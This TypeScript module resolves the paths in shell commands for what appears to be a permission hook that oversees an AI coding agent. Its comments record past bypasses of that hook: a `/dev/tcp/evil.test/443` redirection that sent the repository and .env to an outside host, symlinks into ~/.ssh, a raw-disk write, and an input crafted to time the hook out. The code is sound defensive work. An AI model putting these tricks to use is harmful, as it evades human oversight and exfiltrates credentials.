// THE ONE PATH RESOLVER OF THE SHELL LAYER.
//
// A shell word becomes a path in about forty places in the evaluator: a redirection target, the destination of a
// writer, a `-C` directory, an archive's extraction root, the payload of `find -exec`, a git pathspec, the value of an
// output option, the file a script reader opens. Each of them used to join the working directory and the word with
// `resolve(cwd, word)` and judge the result. `resolve` applies `..` to the TEXT, and the shell does not: the kernel
// resolves `d/../x` by following `d` first, so with `d -> .claude/sub` the file is `.claude/x`, and `resolve` said
// `x`. `echo x > d/../settings.json` was ALLOW while `cd d && echo x > ../settings.json` — the same file — was DENY,
// and the structured tools (Write, Edit, apply_patch) already judged it correctly. Two readers of one question
// drifted, which is the defect this repository has met most often.
//
// So the question is asked in exactly one place. `pathCandidates(cwds, word)` answers WHAT PATHS MAY THIS WORD DENOTE,
// and a caller judges every one of them and keeps the worst:
//
//   - the LEXICAL reading, `..` applied to the text. It stays because a protected NAME is a property of the typed
//     path (a `.git` that is itself a link has a realpath that no longer says `.git`), and because a lexical reading
//     can only make the verdict stricter, never weaker;
//   - the PHYSICAL reading, every component followed as the kernel follows it, `..` the parent of the directory
//     REACHED. A link whose target is missing is still followed (the nearest existing ancestor decides), a loop or
//     a chain of links is cut by a budget the whole resolution shares;
//   - each of them for the word as written AND for it trimmed, because a quoted word keeps its padding and a tool
//     that trims it opens another file (`" /etc/cron.d/x"`);
//   - each of them in EVERY directory the shell may be in (the working directory is a set, see cwdTimeline);
//   - after the word's own expansion: `~`, `~+`, `~-`, `~user`, `$HOME`, `${HOME}`, `$PWD`, `$OLDPWD`, a one-character
//     bracket class — the expansions the shell performs before it opens anything.
//
// WHAT THIS MODULE DOES NOT DO is judge: it knows nothing of capabilities. It also never throws and never walks more
// than it must — a word with no `..` has no physical reading of its own (the classifier canonicalises the lexical one),
// so ordinary work pays for no filesystem call it did not already make.
import { homedir, userInfo } from 'node:os';
import { readlinkSync, realpathSync } from 'node:fs';
import { basename, dirname, isAbsolute, join, resolve, sep } from 'node:path';

/** How many links one path resolution may follow before it is read as a loop (Linux stops at 40). */
export const MAX_LINK_HOPS = 40;

/* ------------------------------------------------------------------------------------------------------------- *
 * One evaluation, one view of the filesystem
 * ------------------------------------------------------------------------------------------------------------- */

/** The kernel only READS the disk while it decides, and a decision is made in milliseconds: what `realpath` said at its
 *  first question is what it will say at the thirtieth. The cache lives for one evaluation (`withPathCache`) and is
 *  gone when the call returns, so a link that appears between two calls is seen by the second. */
let cache: Map<string, string> | null = null;

export function withPathCache<T>(body: () => T): T {
  if (cache !== null) return body(); // nested: the outer evaluation owns it
  cache = new Map();
  try {
    return body();
  } finally {
    cache = null;
  }
}

/**
 * Canonical absolute path: symlinks resolved on the deepest existing ancestor so a not-yet-created file compares
 * correctly.
 *
 * A LINK WHOSE TARGET DOES NOT EXIST YET IS STILL A LINK. `realpath` fails on `lnk -> ~/.ssh/zz-new` exactly as it
 * fails on a file that was never created, and the fallback below then judged the link's own name — `<workspace>/lnk`,
 * an ordinary repository path — while `open(O_CREAT)` follows the link and creates `~/.ssh/zz-new`. So `Write`,
 * `apply_patch` and a shell redirection through such a link were `fs.repo.write` ALLOW for a credential store (audit
 * 2026-10-01, C3). A link shipped inside a cloned repository is enough; nothing has to make it in-session. The
 * name is therefore followed the way the kernel follows it: read the link, resolve what it names (itself possibly
 * missing, possibly another link) and judge the nearest existing ancestor of the destination.
 *
 * The text is normalised first (`resolve`), so a `..` in `p` is applied to the TEXT: this is the realpath of a path
 * that is already a path. A SHELL WORD goes through `pathCandidates`, which applies `..` the way the kernel does.
 */
export function canonicalPath(p: string): string {
  const abs = resolve(p);
  // A PATH LONGER THAN THE KERNEL OPENS IS NOT WALKED. `open` answers ENAMETOOLONG for it, so there is no file for the walk to
  // find, and the walk below recurses once per component and asks the disk at each: a twenty-thousand-component word took
  // seconds and blew the stack - an exception in the hook is a refusal, but a hook that outlives its host's patience is not
  if (abs.length > PATH_MAX) return abs;
  const known = cache?.get(abs);
  if (known !== undefined) return known;
  const out = canonicalWalk(abs, { left: MAX_LINK_HOPS });
  cache?.set(abs, out);
  return out;
}

/** `budget` is shared by the whole resolution, as the kernel's own limit is: a farm of links cannot make it exponential. */
function canonicalWalk(abs: string, budget: { left: number }): string {
  try {
    return realpathSync(abs);
  } catch {
    const parent = dirname(abs);
    if (parent === abs) return abs;
    // `basename`, not a slice past the parent's length: for a missing top-level name (`/zz`) the parent is `/`, one
    // character long, and the slice dropped the name
    const here = join(canonicalWalk(parent, budget), basename(abs));
    let target: string;
    try {
      target = readlinkSync(here);
    } catch {
      return here; // not a link (or nothing there at all): the name is the answer
    }
    // a loop, or a chain longer than the kernel would follow, cannot be opened at all; its own name is as good an answer
    if (budget.left-- <= 0) return here;
    return walkComponents(isAbsolute(target) ? sep : dirname(here), target, budget);
  }
}

/**
 * Walks `path` one component at a time from `from`, the way the kernel resolves it: a symlink is followed where it
 * stands (existing or not), and `..` is the parent of the DIRECTORY REACHED, not of the text before it. The text
 * form `resolve()` computes is only right when no component is a link, and `d/../x` with `d -> /elsewhere/deep`
 * names `/elsewhere/x`, not `x` beside `d`.
 */
function walkComponents(from: string, path: string, budget: { left: number }): string {
  let cur = from;
  for (const part of path.split('/')) {
    if (part === '' || part === '.') continue;
    // `cur` is always canonical here, so the parent of the directory REACHED is just its dirname
    cur = part === '..' ? dirname(cur) : canonicalWalk(join(cur, part), budget);
  }
  return cur;
}

const hasDotDot = (p: string): boolean => /(^|\/)\.\.(\/|$)/.test(p);

/** The longest path the kernel will open (Linux 4096; macOS is 1024). */
const PATH_MAX = 4096;

/** The physical reading of `literal` from `base` (the root for an absolute word). A decision reads the same word at several
 *  sites - the redirection, the ledger, the trust-store check - and a walk costs a filesystem call per component, so it is
 *  made once per evaluation. A walk starts with a fresh link budget, so its answer does not depend on who asked first. */
function physicalReading(base: string | null, literal: string): string {
  const key = `\0physical\0${base ?? ''}\0${literal}`;
  const known = cache?.get(key);
  if (known !== undefined) return known;
  const out = walkComponents(base === null ? sep : canonicalPath(base), literal, { left: MAX_LINK_HOPS });
  cache?.set(key, out);
  return out;
}

/** Where a path that may contain `..` lands once every link it passes through is followed (see walkComponents). */
export function physicalPath(p: string, cwd: string): string {
  const budget = { left: MAX_LINK_HOPS };
  return isAbsolute(p) ? walkComponents(sep, p, budget) : walkComponents(canonicalPath(cwd), p, budget);
}

/** An absolute path that is NOT a shell word — a registered repository root, a value read from a configuration file —
 *  normalised as text. A word typed on a command line goes through `pathCandidates`, never through here. */
export function lexicalPath(absolute: string): string {
  return resolve(absolute);
}

/* ------------------------------------------------------------------------------------------------------------- *
 * Padding
 * ------------------------------------------------------------------------------------------------------------- */

/** What a host's own string handling treats as padding: `\s`, plus NEXT LINE and MONGOLIAN VOWEL SEPARATOR (the
 *  Unicode White_Space of Rust's `trim` and of older tables, which JavaScript's `\s` does not cover). */
const HOST_PADDING = /[\s\u0085\u180e]/;
/**
 * `trim` with the padding set above. A LOOP, NOT `replace(/^\s+|\s+$/g, '')`: the trailing alternative is quadratic on a
 * long run of spaces that is NOT at the end (`/\s+$/` restarts at every space), and a patch line of 200 000 spaces and an
 * `x` would hold the hook for minutes - a hook that times out is a non-blocking error on the host, so the call it was
 * judging would simply run.
 */
export function hostTrim(s: string): string {
  let a = 0;
  let b = s.length;
  while (a < b && HOST_PADDING.test(s[a]!)) a++;
  while (b > a && HOST_PADDING.test(s[b - 1]!)) b--;
  return s.slice(a, b);
}

/* ------------------------------------------------------------------------------------------------------------- *
 * Devices and descriptor aliases
 * ------------------------------------------------------------------------------------------------------------- */

/** `/dev/tcp/HOST/PORT` and `/dev/udp/HOST/PORT` ARE NOT FILES. bash intercepts the pathname inside its own
 *  redirection code and calls connect(2); nothing is opened on disk, and `ls /dev/tcp` is ENOENT. */
const NET_DEVICE_RE = /^\/dev\/(tcp|udp)\/([^/]+)\/([^/]+)$/;

/**
 * THE DEVICES THAT SWALLOW WHAT THEY ARE GIVEN OR PRODUCE WHAT THEY ARE ASKED FOR, and nothing else.
 *
 * One reader, for a redirection (`> /dev/null`) and for an option-valued destination (`curl -o /dev/null`) alike. They
 * used to be two: the redirection dropped every path under `/dev` before it was judged (so `echo x > /dev/disk0`
 * wrote a raw disk at ALLOW, and so would `/dev/mem`), while an option's value was judged as a file outside the
 * workspace — which made the health check `curl -s -o /dev/null -w '%{http_code}' URL` an absolute DENY. A discard
 * device is decided by NAME, from this list, after the path is resolved (`/dev/../etc/x` is `/etc/x`).
 *
 *   /dev/null, /dev/zero, /dev/full   data sinks and sources with no state
 *   /dev/random, /dev/urandom         read for bytes; a write only mixes entropy
 *   /dev/stdin, /dev/stdout, /dev/stderr, /dev/fd/0, /dev/fd/1, /dev/fd/2
 *                                     the command's OWN standard streams: whatever file they are was judged where the
 *                                     stream was opened (`> out.log`), and naming them again opens nothing new
 *   /dev/tty                          the controlling terminal. It is output to the human who is watching, or fails
 *                                     when there is no terminal; it is a file nowhere. A stricter answer would ask on
 *                                     `exec < /dev/tty`, which every husky hook runs to read a prompt.
 *
 * NOT here, deliberately: `/dev/fd/N` for N >= 3 (and the `/proc/<pid>/fd` links they are) is whatever descriptor an
 * earlier `exec 3>file`, or the parent process, left open — a destination nobody named on this line, so it asks
 * (`descriptorAlias`). Neither is a raw device (`/dev/disk0`, `/dev/sda`, `/dev/mem`, `/dev/kmem`), another
 * terminal (`/dev/pts/3`) or the console: those are destinations, and they are judged as the paths they are.
 */
const DISCARD_DEVICES: ReadonlySet<string> = new Set([
  '/dev/null',
  '/dev/zero',
  '/dev/full',
  '/dev/random',
  '/dev/urandom',
  '/dev/stdin',
  '/dev/stdout',
  '/dev/stderr',
  '/dev/tty',
  '/dev/fd/0',
  '/dev/fd/1',
  '/dev/fd/2',
  '/proc/self/fd/0',
  '/proc/self/fd/1',
  '/proc/self/fd/2',
  '/proc/thread-self/fd/0',
  '/proc/thread-self/fd/1',
  '/proc/thread-self/fd/2',
]);

/** True when ONE ABSOLUTE PATH names a discard device. Resolves first: `/dev/../etc/passwd` is `/etc/passwd`. */
export function isDiscardDevice(path: string): boolean {
  if (!path.startsWith('/')) return false;
  return DISCARD_DEVICES.has(resolve(path));
}

/** True when an absolute path is `/dev/tcp/…` or `/dev/udp/…`: a socket bash opens itself, so it is not judged in the PATH
 *  channel (as a write outside the workspace, which would deny the ordinary `echo > /dev/tcp/localhost/8080`
 *  connectivity check) - the `net-redirect` marker carries it to the network capability, where `nc localhost 8080` already
 *  sits. It must not be mistaken for a discard either: `tar czf - . > /dev/tcp/evil.test/443` streamed the whole
 *  repository, `.git` and `.env` included, to an arbitrary host at ALLOW, with no network binary anywhere on the line
 *  (exit review 7). */
export function isNetworkDevice(path: string): boolean {
  return path.startsWith('/') && NET_DEVICE_RE.test(resolve(path));
}

/** True when an absolute path is `/dev` or lies under it, AFTER resolution (`/dev/..` is `/`, and a nine-character prefix
 *  test once turned `/dev/../Users/me/.zshrc` into an ALLOW for any path on the machine). A device NAME is not file
 *  content: listing `/dev` reads nothing, and a read of a device node is not a read of the workspace. This is the
 *  question for a READ; whether a WRITE is swallowed is `isDiscardDevice`. */
export function isDevPath(path: string): boolean {
  const a = path.startsWith('/') ? resolve(path) : path;
  return a === '/dev' || a.startsWith('/dev/');
}

/** A path that is an ALIAS for something a name does not say: the working directory (`/proc/self/cwd`), the root
 *  (`/proc/self/root`), another process's, or an open descriptor above 2 (`/dev/fd/3`, `/proc/self/fd/3`). The text
 *  is not where it leads, and where it leads is decided by the process that opens it. */
const PROC_ALIAS_RE = /^\/proc\/(self|thread-self|\d+)\/(cwd|root|fd(?:info)?)(\/.*)?$/;
const DEV_FD_RE = /^\/dev\/fd\/(\d+)(\/.*)?$/;

export function descriptorAlias(path: string): string | null {
  if (!path.startsWith('/')) return null;
  const a = resolve(path);
  const dev = DEV_FD_RE.exec(a);
  if (dev) return Number(dev[1]) <= 2 && dev[2] === undefined ? null : `${a} is an open descriptor, which this line does not name`;
  const proc = PROC_ALIAS_RE.exec(a);
  if (!proc) return null;
  if (proc[2] === 'cwd') return `${a} is the working directory of ${proc[1] === 'self' || proc[1] === 'thread-self' ? 'this process' : `process ${proc[1]}`} under another name`;
  if (proc[2] === 'root') return `${a} is the root directory of ${proc[1] === 'self' || proc[1] === 'thread-self' ? 'this process' : `process ${proc[1]}`} under another name`;
  // /proc/<pid>/fd/0..2 are the standard streams (see DISCARD_DEVICES); /proc/<pid>/fd and fd/N above 2 are not
  const fd = /^\/(\d+)$/.exec(proc[3] ?? '');
  if (fd && Number(fd[1]) <= 2 && (proc[1] === 'self' || proc[1] === 'thread-self')) return null;
  return `${a} is an open descriptor of ${proc[1] === 'self' || proc[1] === 'thread-self' ? 'this process' : `process ${proc[1]}`}, which this line does not name`;
}

/* ------------------------------------------------------------------------------------------------------------- *
 * The word's own expansion
 * ------------------------------------------------------------------------------------------------------------- */

/** The login name of the user the command runs as, when the platform will say. */
function currentUser(): string | null {
  try {
    return userInfo().username;
  } catch {
    return null;
  }
}

/** Where another user's home directory may be. The platform's database is not read (a lookup is a process), so every
 *  place a home directory is conventionally found is a candidate, and the word asks (`uncertain`). */
function homesOf(name: string): string[] {
  const homes = new Set<string>([join(dirname(homedir()), name), `/home/${name}`, `/Users/${name}`]);
  if (name === 'root') {
    homes.add('/root');
    homes.add('/var/root');
  }
  return [...homes];
}

/**
 * The shell's expansion of the START of a word, which happens before anything is opened. Returns every text the word
 * may expand to, or null when it cannot be known (a variable, a command substitution, a directory-stack entry).
 *
 *   `~`, `$HOME`, `${HOME}`       the user's home — the whole variable name, so `$HOMEDIR` is another variable
 *   `~+`, `$PWD`, `${PWD}`        the working directory, in each directory the shell may be in
 *   `~-`, `$OLDPWD`, `${OLDPWD}`  the previous directory, where the command line has one (`old`)
 *   `~name`                       that user's home: every conventional place, and the word asks
 *   `[h]`                         a one-character bracket class IS that character: both shells open the real name
 *
 * A one-character class is collapsed here rather than left as a glob, because a glob only reaches ASK and this
 * spelling is not ambiguous at all: `.[h]arness/runtime/decisions/d1.json` names one path (exit review 10). A class
 * with more than one character, a range or a negation stays a glob and keeps its opacity.
 */
function expandStart(
  word: string,
  dirs: readonly string[],
  old: readonly string[] | undefined,
  note: { uncertain: string | null },
): string[] | null {
  const t = word.replace(/\[([^\]!^\\/-])\]/g, '$1');
  let m: RegExpExecArray | null;
  // (`$NAME` ends where the identifier does, so `$HOMEDIR` is another variable; `${NAME}` ends at its brace, so `${HOME}x`
  // IS the home directory followed by an `x`; a tilde-prefix ends at the first slash)
  if ((m = /^(?:(?:~\+|\$PWD)(?=\/|$)|\$\{PWD\})([\s\S]*)$/.exec(t))) return dirs.map((d) => d + m![1]);
  if ((m = /^(?:(?:~-|\$OLDPWD)(?=\/|$)|\$\{OLDPWD\})([\s\S]*)$/.exec(t)))
    return old !== undefined && old.length > 0 ? old.map((d) => d + m![1]) : null;
  if (/^~[+-]?\d/.test(t)) return null; // the directory stack: not tracked
  if ((m = /^(?:(?:~|\$HOME)(?=\/|$)|\$\{HOME\})([\s\S]*)$/.exec(t))) return [homedir() + m[1]];
  if ((m = /^~([A-Za-z0-9_.-]+)(?=\/|$)([\s\S]*)$/.exec(t))) {
    if (m[1] === currentUser()) return [homedir() + m[2]];
    note.uncertain ??= `~${m[1]} is another user's home directory, which this kernel does not look up`;
    return homesOf(m[1]!).map((h) => h + m![2]);
  }
  return [t];
}

/* ------------------------------------------------------------------------------------------------------------- *
 * pathCandidates
 * ------------------------------------------------------------------------------------------------------------- */

export interface PathCandidates {
  /** Every absolute path the word may denote. The LEXICAL readings are not canonicalised (the classifier matches the typed
   *  NAME as well as the resolved path); the PHYSICAL reading, which differs from the lexical one only when a `..` follows
   *  a link, is canonical. For a glob this is the literal prefix, as it has always been. */
  readonly paths: string[];
  /** The word has a part nobody can know (`$VAR`, a command substitution, `~-3`): nothing is said about where it lands. */
  readonly dynamic: boolean;
  readonly glob: boolean;
  /** Why the word cannot be pinned down although its text is known — a `/proc/self/cwd` alias, an open descriptor, another
   *  user's home. The caller asks: the readings above are a lower bound. */
  readonly uncertain: string | null;
}

/** One spelling of a word, read in every directory: the lexical readings, and the physical ones that differ from them. */
interface Reading {
  lexical: string[];
  physical: string[];
  glob: boolean;
}

function readVariant(
  variant: string,
  dirs: readonly string[],
  old: readonly string[] | undefined,
  note: { uncertain: string | null },
  whole = false,
  literalText = false,
): Reading | null {
  const texts = literalText ? [variant] : expandStart(variant, dirs, old, note);
  // a part the shell fills in at run time: one reading that cannot be named makes the word unnameable
  if (texts === null || (!literalText && texts.some((x) => /[$`]/.test(x)))) return null;
  const out: Reading = { lexical: [], physical: [], glob: false };
  for (const text of texts) {
    const cut = literalText ? -1 : text.search(/[*?[{]/);
    if (cut >= 0) out.glob = true;
    const literal = cut >= 0 && !whole ? text.slice(0, cut) : text;
    for (const base of isAbsolute(literal) ? [null] : dirs) {
      const lexical = base === null ? resolve(literal) : resolve(base, literal);
      out.lexical.push(lexical);
      // the physical reading differs only where a `..` can follow a link; a word without one is judged by the
      // lexical reading's canonical form, which is what the classifier makes of it
      // (a path longer than PATH_MAX cannot be opened at all - ENAMETOOLONG - so it has no physical reading to walk)
      if (hasDotDot(literal) && literal.length <= PATH_MAX) {
        const physical = physicalReading(base, literal);
        if (physical !== canonicalPath(lexical)) out.physical.push(physical);
      }
      out.lexical.push(...aliasReadings(literal, lexical, dirs, note));
    }
  }
  return out;
}

/**
 * WHAT PATHS MAY THIS SHELL WORD DENOTE. See the head of this file. `cwds` is the set of directories the shell may be
 * in (a string is a set of one); `old` is the set `~-` and `$OLDPWD` may name, when the command line has one. A glob is
 * read by its literal prefix unless `whole` asks for the text as it stands (a protected pattern is matched against the
 * word the shell will expand, `control-plane/*.md`, and a prefix that ends in a slash matches nothing). `literal` reads the
 * text as a plain path with nothing expanded and no glob — the way a structured tool (Write, Edit, Read) is handed one.
 */
export function pathCandidates(
  cwds: string | readonly string[],
  word: string,
  old?: readonly string[],
  options: { whole?: boolean; literal?: boolean } = {},
): PathCandidates {
  const dirs = directoriesOf(cwds);
  // the word as written, and as a tool that trims it would read it
  const trimmed = hostTrim(word);
  const note: { uncertain: string | null } = { uncertain: null };
  const paths = new Set<string>();
  let glob = false;
  for (const variant of trimmed !== word && trimmed !== '' ? [word, trimmed] : [word]) {
    const r = readVariant(variant, dirs, old, note, options.whole === true, options.literal === true);
    if (r === null) return { paths: [], dynamic: true, glob: false, uncertain: null };
    glob ||= r.glob;
    for (const p of [...r.lexical, ...r.physical]) paths.add(p);
  }
  return { paths: [...paths], dynamic: false, glob, uncertain: note.uncertain };
}

function directoriesOf(cwds: string | readonly string[]): string[] {
  const dirs = [...new Set(typeof cwds === 'string' ? [cwds] : cwds)].filter((d) => d !== '' && !d.startsWith('\0'));
  if (dirs.length === 0) dirs.push(process.cwd());
  return dirs;
}

/**
 * The places an alias path leads, as far as they can be told: `/proc/self/cwd/x` is `x` in the working directory. An alias is
 * recognised in the text BEFORE any `..` is applied as well: `/proc/self/cwd/../x` is beside the working directory, and
 * collapsing the `..` first turned it into `/proc/self/x`, which names nothing.
 */
function aliasReadings(
  literal: string,
  lexical: string,
  dirs: readonly string[],
  note: { uncertain: string | null },
): string[] {
  const probes: Array<{ at: string; tail: string }> = [{ at: lexical, tail: '' }];
  if (isAbsolute(literal) && hasDotDot(literal)) {
    const head = literal.split(/\/\.\.(?:\/|$)/)[0] || '/';
    probes.push({ at: resolve(head), tail: literal.slice(head.length) });
  }
  const out: string[] = [];
  for (const { at, tail } of probes) {
    const why = descriptorAlias(at);
    if (why === null) continue;
    note.uncertain ??= why;
    const m = PROC_ALIAS_RE.exec(at);
    if (!m || (m[1] !== 'self' && m[1] !== 'thread-self')) continue;
    const rest = '.' + (m[3] ?? '') + tail;
    if (m[2] === 'cwd') out.push(...dirs.map((d) => resolve(d, rest)));
    else if (m[2] === 'root') out.push(resolve(sep, rest));
  }
  return out;
}

/* ------------------------------------------------------------------------------------------------------------- *
 * The readers that are not judges
 * ------------------------------------------------------------------------------------------------------------- */

/**
 * THE FILE A COMMAND OPENS, for the readers that open it themselves (a script, a makefile, a response file, a pathspec
 * list): the PHYSICAL path, because that is the file whose bytes will run. Reading the lexical reading of
 * `d/../Makefile` read a different file than the one `make -f d/../Makefile` executes. Null when the word is dynamic or a glob.
 * The word is NOT trimmed: this is the file the shell opens, not the one a lenient tool might.
 */
export function openedPath(cwd: string, word: string): string | null {
  const r = readVariant(word, directoriesOf(cwd), undefined, { uncertain: null });
  // a glob is a SET of files the shell expands; no reader opens "the file" it names
  if (r === null || r.glob || r.lexical.length === 0) return null;
  return r.physical[0] ?? canonicalPath(r.lexical[0]!);
}

/**
 * THE DIRECTORY A PROGRAM'S OWN `-C DIR` / `--chdir` LEAVES IT IN. The program calls chdir(2), which follows every link
 * and applies `..` to the directory REACHED, so a word with a `..` in it is judged by its physical reading; any other
 * word keeps the lexical spelling (the text the caller already compares), because the two name the same directory. Null
 * when the word is dynamic or a glob.
 */
export function chdirPath(base: string, word: string): string | null {
  const r = readVariant(word, directoriesOf(base), undefined, { uncertain: null });
  if (r === null || r.glob || r.lexical.length === 0) return null;
  return r.physical[0] ?? r.lexical[0]!;
}

/**
 * The directories a `cd`-like word may leave the shell in. `cd d/..` goes two places: LOGICAL (the default) applies `..`
 * to the text of $PWD, PHYSICAL (`-P`, `set -P`, zsh's chase_dots) follows the link first, and which one the shell uses
 * can be changed by an earlier line — so unless the command says `-P` itself, both are possible. Null when the word is
 * dynamic, or names the directory stack.
 */
export function directoryCandidates(base: string, word: string, physicalOnly = false): string[] | null {
  const r = readVariant(word, directoriesOf(base), undefined, { uncertain: null });
  // a glob in a `cd` word is expanded by the shell into a name nobody here can enumerate
  if (r === null || r.glob || r.lexical.length === 0) return null;
  const logical = canonicalPath(r.lexical[0]!);
  const physical = r.physical[0] ?? logical;
  if (physicalOnly) return [physical];
  return physical === logical ? [logical] : [logical, physical];
}
